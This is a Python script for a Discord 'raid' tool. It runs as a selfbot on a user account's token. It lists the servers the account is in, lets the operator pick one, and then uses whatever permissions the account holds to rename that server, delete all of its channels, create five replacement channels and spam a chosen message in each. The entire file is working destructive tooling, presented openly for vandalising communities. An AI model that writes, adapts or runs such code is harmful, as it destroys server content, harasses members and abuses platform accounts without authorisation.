import discord
import os
from dotenv import load_dotenv
import asyncio

load_dotenv()
bot = discord.Client()


def intro():
    print("Welcome!\nLet's raid some servers, shall we?")


async def begin_raid():
    perms = target_server.me.guild_permissions
    print(f"Target server: {target_server.name} ({target_server.id})")
    if perms.administrator:
        print(
            "\nYou seem to have administrator permissions, this makes things a lot easier.")
        await asyncio.sleep(1)
        print("What's going to happen:\n[.] Change the server name to your heart's desire\n[.] Delete all channels in the target server\n[.] Create 5 new channels with the name of your choice\n[.] Spam the message of your choice in every channel")
        sname = input("\nWhat do you want the server name to change to? ")
        cname = input("What do you want the channel names to be? ")
        msg = input("What do you want the spammed message to be? ")
        confirmation = str(input(
            "Alrighty, that's everything. Are you sure you want to continue? (y/n) ")).lower()
        if confirmation == "y":
            try:
                await target_server.edit(name=sname)
                print(f"\n[.] Server name changed to {sname}")
                for channel in target_server.channels:
                    await channel.delete()
                print("[.] All channels deleted")
                for x in range(5):
                    await target_server.create_text_channel(cname)
                print(f"[.] 5 new channels created with the name of {cname}")
                for channel in target_server.text_channels:
                    await channel.send(msg)
                print(f"[.] Sent desired message in every channel.")
                print("[.] Raid complete!\n\nGoodbye!")
                os._exit(1)
            except Exception as e:
                print(f"\nSomething went wrong: {e}")
        elif confirmation == "n":
            print("\nOkay, come back when you're sure.")
            os._exit(1)
        else:
            print("\nInvalid input, please try again.")
            os._exit(1)

    else:
        print("\nYou don't seem to have administrator permissions, this makes things a bit harder.")
        await asyncio.sleep(1)
        op = "\nWhat's going to happen:\n"
        if perms.manage_guild:
            print("You have the manage_guild permissions.")
            op += "[.] Change the server name to your heart's desire\n"
            await asyncio.sleep(0.5)
        else:
            print(
                "You don't have the manage_guild permission, you can't change the server name.")
            await asyncio.sleep(0.5)
        if perms.manage_channels:
            print("You have the manage_channels permission.")
            op += "[.] Delete all channels in the target server\n[.] Create 5 new channels with the name of your choice\n"
            await asyncio.sleep(0.5)
        else:
            print(
                "You don't have the manage_channels permission, you can't delete/create channels.")
            await asyncio.sleep(0.5)
        op += "[.] Spam the message of your choice in every channel\n"
        print(op)
        confirmation = str(input(
            "Alrighty, that's everything. Are you sure you want to continue? (y/n) ")).lower()
        if confirmation == "y":
            try:
                if perms.manage_guild:
                    sname = input(
                        "\nWhat do you want the server name to change to? ")
                    await target_server.edit(name=sname)
                    print(f"\n[.] Server name changed to {sname}")
                    await asyncio.sleep(0.5)
                if perms.manage_channels:
                    for channel in target_server.channels:
                        await channel.delete()
                    print("[.] All channels deleted")
                    await asyncio.sleep(0.5)
                    cname = input("What do you want the channel names to be? ")
                    for x in range(5):
                        await target_server.create_text_channel(cname)
                    print(
                        f"[.] 5 new channels created with the name of {cname}")
                msg = input("What do you want the spammed message to be? ")
                for channel in target_server.text_channels:
                    await channel.send(msg)
                print(f"\n[.] Sent desired message in every channel.")
                print("[.] Raid complete!\n\nGoodbye!")
                os._exit(1)
            except Exception as e:
                print(f"\nSomething went wrong: {e}")
        elif confirmation == "n":
            print("\nOkay, come back when you're sure.")
            os._exit(1)
        else:
            print("\nInvalid input, please try again.")
            os._exit(1)


@bot.event
async def on_ready():
    print(f"Connected as {bot.user.name} ({bot.user.id})\n")
    await asyncio.sleep(1)
    print("Joined servers:")
    for x in range(len(bot.guilds)):
        print(f"{x}. {bot.guilds[x].name}")

    global target_server
    target_server = bot.guilds[int(
        input("\nWhich server would you like to raid? "))]
    await begin_raid()

intro()
bot.run(os.getenv("TOKEN"), bot=False)
